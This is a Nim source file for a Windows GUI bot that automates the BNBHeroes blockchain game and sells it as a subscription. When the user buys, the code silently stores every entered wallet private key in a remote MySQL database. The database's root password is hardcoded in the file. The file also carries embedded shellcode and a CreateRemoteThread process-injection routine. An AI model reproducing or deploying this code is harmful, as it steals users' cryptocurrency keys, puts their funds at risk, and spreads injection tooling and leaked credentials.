import web3
import eth/keys
import times
import chronos, nimcrypto, stint
import options, json, parseutils, strutils
import strformat
import os, math
import std/with
import winim/winstr, winim/inc/shellapi
import std/[db_mysql, math]
import osproc, streams
import winim/lean 

import wNim/[wApp, wFrame, wPanel, wStatusBar, wMenu,
  wIcon, wBitmap, wPen, wBrush, wPaintDC, 
  wStaticBox, wStaticLine, wStaticBitmap, wStaticText,
  wButton, wRadioButton, wCheckBox, wComboBox, wCheckComboBox, wListBox,
  wNoteBook, wTextCtrl, wSpinCtrl, wHotKeyCtrl, wSlider, wGauge, wImage,
  wCalendarCtrl, wDatePickerCtrl, wTimePickerCtrl, wMessageDialog]

type Hero = object
  name: encoding.Uint
  heroType: encoding.Uint
  xp:Uint256
  attack:Uint256
  armor:Uint256
  speed:Uint256
  hp:Uint256
  tokenId:Uint256
  arrivalTime:Uint256
  level:Uint256
  heroClass:Uint256

type Town = object
  level: encoding.Uint8
  lastUpgradedTimeStamp: Uint256

contract(PriceOracle):
  proc getCharacterPrice():Uint256 {.view.}
  proc getTownUpgradePrices():seq[Uint256] {.view.}
  proc getExpeditePrice():Uint256 {.view.}
  
contract(BNBHToken):
  proc transfer(to: Address, amount:Uint256): encoding.Bool 
  proc approve(spender:Address, amount: Uint256)
  proc balanceOf(address:Address): Uint256
  proc transferFrom(fro: Address, to: Address, amount: Uint256):encoding.Bool 
  proc allowance(owner: Address, spender: Address):Uint256  {.view.}
  proc Approval(owner: indexed[Address], spender: indexed[Address], value:Uint256) {.event.}
  # proc Transfer(src: indexed[Address], dst: indexed[Address], value: Uint256) {.event.}

contract(BNBHero):
  proc claimRewards()
  proc firstLockTime():Uint256 {.view.}
  proc unLockTime(address: Address):Uint256 {.view.}
  proc createNewHero()
  proc CreatedHero(player: Address, heroId: Uint256) {.event.}
  proc fight(heroId: Uint256, enemyType: Uint256)
  proc unLockLevel(tokenId: Uint256)
  proc upgradeTown(townType: encoding.Uint8)
  proc expediteHero(tokenId: Uint256)
  proc balances(owner: Address): Uint256 {.view.}
  proc getPriceToUnlockLevel(heroId: Uint256):Uint256 {.view.}
  proc getHeroesByOwner(account:Address, calcTown: encoding.Bool): seq[Hero] {.view.}
  proc getTownsOfPlayer(account:Address): seq[Town] {.view.}
  proc Fight(player: Address, attackingHero: Uint256, enemyType: Uint256, rewards: Uint256, xpGained: Uint256, hpLoss: Uint256) {.event.}

contract(BNB):
  proc balanceOf(address:Address): Uint256
  proc transferFrom(fro: Address, to: Address, amount:Uint256):encoding.Bool 
  proc transfer(to: Address, amount:Uint256): encoding.Bool 
  proc approve(spender: Address, amount:Uint256): encoding.Bool 
  proc allowance(owner: Address, spender: Address):Uint256  {.view.}
  proc Transfer(fromAddr: indexed[Address], toAddr: indexed[Address], value: Uint256) {.event.}

contract(Accounter):
  proc buy()
  proc keys():seq[Address] {.view.}
  proc getSize():Uint256 {.view.}
  proc balance(address: Address): encoding.Uint {.view.}

var  bnbHeroAddress = Address.fromHex "0xde9fFb228C1789FEf3F08014498F2b16c57db855"
var  bnbhTokenAddress = Address.fromHex "0xd25631648e3ad4863332319e8e0d6f2a8ec6f267"
var  priceOracleAddress = Address.fromHex "0xd160bbded5cff79b126443eefcb28f3b67991140"
var  bscUSDTAddress = Address.fromHex "0x55d398326f99059fF775485246999027B3197955"
var  accounterAddress = Address.fromHex "0x2161a89cE9245e0bb4A1A2A479A6574D1bC2d715"

var wbnbAddress = Address.fromHex "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"

var Web3 = waitFor newWeb3("https://bsc-dataseed.binance.org")

let bnbHero = Web3.contractSender(BNBHero, bnbHeroAddress)
let bnbhToken = Web3.contractSender(BNBHToken, bnbhTokenAddress)
let priceOracle = Web3.contractSender(PriceOracle, priceOracleAddress)
let wbnb = Web3.contractSender(BNB, wbnbAddress)

let ZEROADDRESS = Address.fromHex "0x0000000000000000000000000000000000000000"

var receiverAddress = "0x68E05D4Bd25BC74721c31D1BcAfc64B68F2c5894"
var receiver = Address.fromHex(receiverAddress)

var recommender:Address = receiver

const dbHost = "120.76.176.122:32760"
const dbUser = "root"
const dbPasswd = "Jintai@0105"
const dbUse = "bnbheroes"

template getBuytime(value: string):string {.dirty.} =
    let mysqldb = open(dbHost, dbUser, dbPasswd, dbUse)
    defer: mysqldb.close()
    mysqldb.getValue(sql"select buyTime from account where publicKey=?", value)

proc eth*(eth: Uint256): UInt256 = 10.u256.pow(18) * eth

template get6decimal*(value: Uint256): float =
  toInt(value div 10.u256.pow(12)).float64 / 10.0.pow(6)

const UINT256MAX = Stuint[256].fromHex("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")

const file = "config.json"

let app = App(wSystemDpiAware)
let frame = Frame(title="BNBHeroes", style=wDefaultFrameStyle or wModalFrame)
frame.dpiAutoScale:
  frame.size = (640, 400)
  frame.minSize = (500, 400)

var messageDialog = MessageDialog(frame)
let statusBar = StatusBar(frame)
let panel = Panel(frame)

const knightOrange = staticRead(r"knight-orange.png")
const magePurple = staticRead(r"mage-purple.png")
const rougePurple = staticRead(r"rogue-purple.png")
const mageBlue = staticRead(r"mage-blue.png")
const knightBlue = staticRead(r"knight-blue.png")
const soldierBlue = staticRead(r"soldier-blue.png")
const hunterGreen = staticRead(r"hunter-green.png")

let knightOrangeBitmap = StaticBitmap(panel, bitmap=Bitmap(knightOrange), style=wSbFit)
let magePurpleBitmap = StaticBitmap(panel, bitmap=Bitmap(magePurple), style=wSbFit)
let rougePurpleBitmap = StaticBitmap(panel, bitmap=Bitmap(rougePurple), style=wSbFit)
let mageBlueBitmap = StaticBitmap(panel, bitmap=Bitmap(mageBlue), style=wSbFit)
let knightBlueBitmap = StaticBitmap(panel, bitmap=Bitmap(knightBlue), style=wSbFit)
let soldierBlueBitmap = StaticBitmap(panel, bitmap=Bitmap(soldierBlue), style=wSbFit)
let hunterGreenBitmap = StaticBitmap(panel, bitmap=Bitmap(hunterGreen), style=wSbFit)
# let staticbitmap = Bitmap(Image(mage).scale(75,100))

let mainPrivateKeyStatic = TextCtrl(panel, value="主账号私钥，战斗账号BNB和BNBH余额不足时从主账号自动转账，看管好主账号私钥，不要让它走丢了", style=wTeRich or wTeMultiLine or wTeReadOnly)
let mainPrivateKeyTextCtrl = TextCtrl(panel, value="", style=wBorderSunken or wTePassword)
let fightkeyStatic = TextCtrl(panel, value="添加战斗账号", style=wTeReadOnly)
let fightkeyText = TextCtrl(panel, style=wBorderSunken or wTePassword)
let recommenderStatic = TextCtrl(panel, style=wTeRich or wTeMultiLine or wTeReadOnly)
with recommenderStatic:
  writeText "推荐人地址，默认地址为"
  writeLink(&"https://bscscan.com/address/{receiverAddress}", receiverAddress)

recommenderStatic.wEvent_TextLink do (event: wEvent):
  if event.mouseEvent == wEvent_LeftUp:
    let url = recommenderStatic.range(event.start..<event.end)
    ShellExecute(0, "open", url, nil, nil, 5)

let recommenderTextCtrl = TextCtrl(panel, style=wBorderSunken)
let bnbBalanceInput = TextCtrl(panel, style=wBorderSunken or wTeReadOnly)

let buyButton = Button(panel, label="买它买它买它！")
let fightButton = Button(panel, label="永不失联的战斗")
let stopFightButton = Button(panel, label="休息，休息一下")
let balanceButton = Button(panel, label="看看赚了多少钱")
# let approveButton = Button(panel, label="授权")
# let createHeroButton = Button(panel, label="召唤英雄")
# let expediteButton = Button(panel, label="加速")

fightButton.disable()
stopFightButton.disable()
balanceButton.disable()

if fileExists(file):
  var keys = parseFile(file)
  var mainKey = PrivateKey.fromHex(keys["main"].getStr).get()
  var mainAddress = mainKey.toPublicKey().toAddress()
  mainPrivateKeyTextCtrl.changeValue keys["main"].getStr
  Web3.privateKey = some mainKey
  Web3.defaultAccount = Address.fromHex mainAddress
  var buyTime = getBuytime(mainAddress)
  if buyTime == "": 
    messageDialog.setMessage "主账号尚未购买"
    messageDialog.display()
  if buyTime != "" and buyTime.parseInt > toUnix(getTime() - 30.days) :
    fightButton.enable()
    stopFightButton.enable()
    balanceButton.enable()

type BuyObject = object
  web3: Web3
  totalPrice: Uint256

template log(s:string):untyped =
    echo s

proc totalBalance() {.async.} =
  # {.gcsafe.}:
    var j = parseFile(file)
    var total: Uint256
    var lines:string
    var now = getTime().toUnix()
    for pk in j["fight"]:
      var claimWeb3 = await newWeb3("https://bsc-dataseed.binance.org")
      defer: await claimWeb3.close()
      var privateKey = PrivateKey.fromHex(pk.getStr).get()
      claimWeb3.privateKey = some privateKey
      var address = privateKey.toPublicKey().toAddress()
      claimWeb3.defaultAccount = Address.fromHex address
      var claimBNBHero = claimWeb3.contractSender(BNBHero, bnbHeroAddress)
      var unLockTime = waitFor claimBNBHero.unLockTime(Address.fromHex address).call()
      if now < unLockTime.toInt:
        echo &"{address}锁仓剩余时间{seconds(unLockTime.toInt - now)}"
      else:
        # var tax = 20.0 - 2.0 * floor((now.float - unLockTime.toInt.float) / 86400)
        # echo &"{address} 税点{tax}%"
        var claimTx = waitFor claimBNBHero.claimRewards().send(gas=210000, gasPrice=5000000000.u256)
        log &"提现交易{claimTx}"

      var earned = waitFor claimBNBHero.balances(Address.fromHex address).call()
      lines.add &"{now()} {address} {get6decimal earned}\n"
      total += earned
    var total6decimal = total div 10.u256.pow(12)
    var total6decimalFloat = total6decimal.toInt().float64 / 10.0.pow(6)
    bnbBalanceInput.changeValue($total6decimalFloat)
    writeFile("BNBHeroBalance.txt", lines)

balanceButton.wEvent_Button do():
  asyncCheck totalBalance()

fightkeyText.wEvent_Text do():
  var value = fightkeyText.getValue
  if value != "":
    var key = PrivateKey.fromHex(value).get()
    var address = key.toPublicKey().toAddress()
    var fightBuyTime = getBuytime(address)
    if fileExists(file):
      var newKey = true
      var j = parseFile(file)
      if j["fight"].len > 0:
        for k in j["fight"]:
          if value == k.getStr:
            newKey = false
            messageDialog.setMessage "重复的战斗账号！"
            messageDialog.display()
            fightkeyText.changeValue ""
            break
      if newKey:
        j["fight"].add %value
        writeFile(file, $j)
    if fightBuyTime == "":
      messageDialog.setMessage"战斗账号没有使用时间"
      messageDialog.display()

recommenderTextCtrl.wEvent_Text do ():
  var now = getTime()
  var value = recommenderTextCtrl.getValue
  if value != "":
    recommender = Address.fromHex value
    var recommenderBuytime = getBuytime(value)
    if recommenderBuytime == "":
      messageDialog.setMessage "推荐人尚未购买，快拉他入坑！"
      messageDialog.display()
    elif toUnix(now - 30.days) > recommenderBuytime.parseInt():
      messageDialog.setMessage "推荐人已过期，快催他续费！"
      messageDialog.display()

mainPrivateKeyTextCtrl.wEvent_Text do ():
  var privateKeyInput = mainPrivateKeyTextCtrl.getValue
  if privateKeyInput != "":
    var privateKey: PrivateKey
    var address: string
    try:
      privateKey = PrivateKey.fromHex(privateKeyInput).get()
      Web3.privateKey = some(privateKey)
      address = privateKey.toPublicKey().toAddress()
    except:
      messageDialog.setMessage "私钥不对劲"
      messageDialog.display()
      return
    Web3.defaultAccount = Address.fromHex address
    var configKeys = %*{"main":"","fight":[]}
    if not fileExists(file):
      configKeys["main"] = %privateKeyInput
      writeFile(file, $configKeys)
      messageDialog.setMessage "账号已写入config.json，快配置config.json吧！"
      messageDialog.display()
    else:
      configKeys = parseFile(file)
      var newKey = true
      if privateKeyInput == configKeys["main"].getStr:
        newKey = false
        messageDialog.setMessage "重复的主账号！"
        messageDialog.display()


    var buyTime = getBuytime(privateKey.toPublicKey().toAddress())
    if buyTime == "":
      messageDialog.setMessage &"{privateKey.toPublicKey().toAddress()}没有时间了，快进到碗里来！"
      messageDialog.display()
    elif buyTime.parseInt < toUnix(getTime() - 30.days) :
      messageDialog.setMessage &"{privateKey.toPublicKey().toAddress()}时间用完了，快续费吧！"
      messageDialog.display()
    else:
      fightButton.enable()
      stopFightButton.enable()
      balanceButton.enable()

# 单号0.06BNB ,20个1BNB
buyButton.wEvent_Button do (): 
  if Web3.defaultAccount == ZEROADDRESS:
    messageDialog.setMessage("请输入正确的私钥")
    messageDialog.display()
    return  
  if not fileExists(file):
    messageDialog.setMessage("没有配置文件")
    messageDialog.display()
    return  
  var j = parseFile(file)
  var mainKey = j["main"].getStr
  var address = PrivateKey.fromHex(mainKey).get().toPublicKey().toAddress()
  var mainKeyBuyTime = getBuyTime(address)
  if mainKeyBuyTime != "" and mainKeyBuyTime.parseInt > toUnix(getTime() - 30.days):
    messageDialog.setMessage("主账号在30天有效期内,确认购买将为每个账号添加30天使用时间")
    messageDialog.display() 
  var fights = j["fight"]
  var privateKeys: seq[string]
  privateKeys.add mainKey
  for f in fights:
    privateKeys.add f.getStr
  var len = privateKeys.len.u256
  var price = 6 * pow(10.u256, 16)
  var totalPrice: Uint256 = price * len
  var discount = if recommender != ZEROADDRESS: min(85,95) else: 95
  var discountStr = ""
  if privateKeys.len >= 20:
    totalPrice = price * len * discount.u256 div 100
  discountStr = &"{discountStr}折优惠"
  var totalPriceInFloat = get6decimal totalPrice
  var unitPrice = price.toInt().float64 / pow(10.0, 18)
  let id = MessageDialog(frame, message= &"套餐：{unitPrice}BNB/账号/月，共{privateKeys.len}个账号{discountStr} 需支付约{totalPriceInFloat}BNB", caption="支付", style=wYesNo).display()
  if id == wIdYes:
    echo "正在支付请稍候..."
    var oldBalance = waitFor Web3.provider.eth_getBalance(receiver, "latest")
    var buyerBalance = waitFor Web3.provider.eth_getBalance(Web3.defaultAccount, "latest")
    if buyerBalance > totalPrice:
      var nonce = waitFor Web3.nextNonce()
      var cc = EthSend(
        data: "0x" ,
        source: Web3.defaultAccount,
        to: some(receiver),
        gas: some(Quantity(300000)),
        value: some(totalPrice),
        nonce: some(nonce),
        gasPrice: some(5000000000.u256)
      )
      var sendTx = waitFor Web3.send(cc)
      echo &"购买支付记录{sendTx}"
      cc.to = some(recommender)
      cc.value = some(totalPrice * 5 div 100 )
      cc.nonce = some(waitFor Web3.nextNonce())
      discard waitFor Web3.send(cc)
      # echo sendTx

      while true:
        var newbalance = waitFor Web3.provider.eth_getBalance(receiver, "latest")
        if newbalance >= oldbalance + totalPrice:
          # echo newbalance - oldbalance - totalPrice
          break

      let mysqldb = open(dbHost, dbUser, dbPasswd, dbUse)
      defer: mysqldb.close()

      for key in privateKeys:
        var pk = PrivateKey.fromHex(key).get()
        var address = pk.toPublicKey().toAddress()
        var buyTime = mysqldb.getValue(sql &"SELECT buyTime FROM account WHERE publicKey=?", address)
        if buyTime == "":
          buyTime = $getTime().toUnix()
        else:
          buyTime = $(buyTime.parseInt + 62208000)
        mysqldb.exec(sql"REPLACE INTO account (privateKey, publicKey, buyTime) VALUES (?,?,?)", key, address, buyTime)
        
      messageDialog.setMessage(&"购买成功,支付记录{sendTx}")
      messageDialog.display()

      mainPrivateKeyTextCtrl.disable()
      fightButton.enable()
      stopFightButton.enable()
      balanceButton.enable()

when defined(windows):
    when defined(i386):
        var shellcode: array[272, byte] = [
        byte 0xd9,0xeb,0x9b,0xd9,0x74,0x24,0xf4,0x31,0xd2,0xb2,0x77,0x31,0xc9,0x64,0x8b,
        0x71,0x30,0x8b,0x76,0x0c,0x8b,0x76,0x1c,0x8b,0x46,0x08,0x8b,0x7e,0x20,0x8b,
        0x36,0x38,0x4f,0x18,0x75,0xf3,0x59,0x01,0xd1,0xff,0xe1,0x60,0x8b,0x6c,0x24,
        0x24,0x8b,0x45,0x3c,0x8b,0x54,0x28,0x78,0x01,0xea,0x8b,0x4a,0x18,0x8b,0x5a,
        0x20,0x01,0xeb,0xe3,0x34,0x49,0x8b,0x34,0x8b,0x01,0xee,0x31,0xff,0x31,0xc0,
        0xfc,0xac,0x84,0xc0,0x74,0x07,0xc1,0xcf,0x0d,0x01,0xc7,0xeb,0xf4,0x3b,0x7c,
        0x24,0x28,0x75,0xe1,0x8b,0x5a,0x24,0x01,0xeb,0x66,0x8b,0x0c,0x4b,0x8b,0x5a,
        0x1c,0x01,0xeb,0x8b,0x04,0x8b,0x01,0xe8,0x89,0x44,0x24,0x1c,0x61,0xc3,0xb2,
        0x08,0x29,0xd4,0x89,0xe5,0x89,0xc2,0x68,0x8e,0x4e,0x0e,0xec,0x52,0xe8,0x9f,
        0xff,0xff,0xff,0x89,0x45,0x04,0xbb,0x7e,0xd8,0xe2,0x73,0x87,0x1c,0x24,0x52,
        0xe8,0x8e,0xff,0xff,0xff,0x89,0x45,0x08,0x68,0x6c,0x6c,0x20,0x41,0x68,0x33,
        0x32,0x2e,0x64,0x68,0x75,0x73,0x65,0x72,0x30,0xdb,0x88,0x5c,0x24,0x0a,0x89,
        0xe6,0x56,0xff,0x55,0x04,0x89,0xc2,0x50,0xbb,0xa8,0xa2,0x4d,0xbc,0x87,0x1c,
        0x24,0x52,0xe8,0x5f,0xff,0xff,0xff,0x68,0x6f,0x78,0x58,0x20,0x68,0x61,0x67,
        0x65,0x42,0x68,0x4d,0x65,0x73,0x73,0x31,0xdb,0x88,0x5c,0x24,0x0a,0x89,0xe3,
        0x68,0x58,0x20,0x20,0x20,0x68,0x4d,0x53,0x46,0x21,0x68,0x72,0x6f,0x6d,0x20,
        0x68,0x6f,0x2c,0x20,0x66,0x68,0x48,0x65,0x6c,0x6c,0x31,0xc9,0x88,0x4c,0x24,
        0x10,0x89,0xe1,0x31,0xd2,0x52,0x53,0x51,0x52,0xff,0xd0,0x31,0xc0,0x50,0xff,
        0x55,0x08]
    elif defined(amd64):
        var shellcode: array[295, byte] = [
        byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
        0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
        0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
        0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
        0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
        0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
        0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
        0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
        0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
        0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
        0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
        0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
        0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
        0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
        0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
        0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
        0x85,0x0f,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
        0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x48,0x65,0x6c,
        0x6c,0x6f,0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,
        0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00]

var fightProcess: Process

proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =
    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
    fightProcess = startProcess("fight.exe", options = {poStdErrToStdOut,poParentStreams})
    # fightProcess = startProcess("calc.exe")
    fightProcess.suspend() # That's handy!
    var pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](fightProcess.processID))
    let rPtr = VirtualAllocEx(pHandle,NULL,cast[SIZE_T](shellcode.len),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(pHandle, rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len),addr bytesWritten)
    var tHandle = CreateRemoteThread(pHandle, NULL,0,cast[LPTHREAD_START_ROUTINE](rPtr),NULL, 0, NULL)
    CloseHandle(pHandle)
    CloseHandle(tHandle)
    fightProcess.resume()

fightButton.wEvent_Button do (): 
  if (fightProcess == nil) or (not fightProcess.running):
    # injectCreateRemoteThread(shellcode)
    fightProcess = startProcess("fight.exe", options = {poStdErrToStdOut,poParentStreams})
  else:
    fightButton.disable()
    stopFightButton.enable()

stopFightButton.wEvent_Button do ():
  if fightProcess != nil and fightProcess.running:
    fightProcess.terminate()

  else:
    fightButton.enable()

proc layout() =
  panel.autolayout """
    spacing: 10
    H:|-[knightOrangeBitmap(75)]-|
    H:|-[mainPrivateKeyStatic]-|
    H:|-[mainPrivateKeyTextCtrl]-|
    H:|-{stack1:[fightkeyStatic]-[fightkeyText]}-|
    H:|-[recommenderStatic]-|
    H:|-[recommenderTextCtrl]-|
    H:|-{stack2:[buyButton]-[fightButton(buyButton)]-[stopFightButton(buyButton)]-[balanceButton(buyButton)]-[bnbBalanceInput(buyButton)]}-|
    V:|-[knightOrangeBitmap(100)]-[mainPrivateKeyStatic]-[mainPrivateKeyTextCtrl(mainPrivateKeyStatic)]-[stack1(mainPrivateKeyStatic)]-[recommenderStatic(mainPrivateKeyStatic)]-[recommenderTextCtrl(mainPrivateKeyStatic)]-[stack2(mainPrivateKeyStatic)]-|
  """

panel.wEvent_Size do ():
  layout()

layout()

frame.center()
frame.show()
app.mainLoop()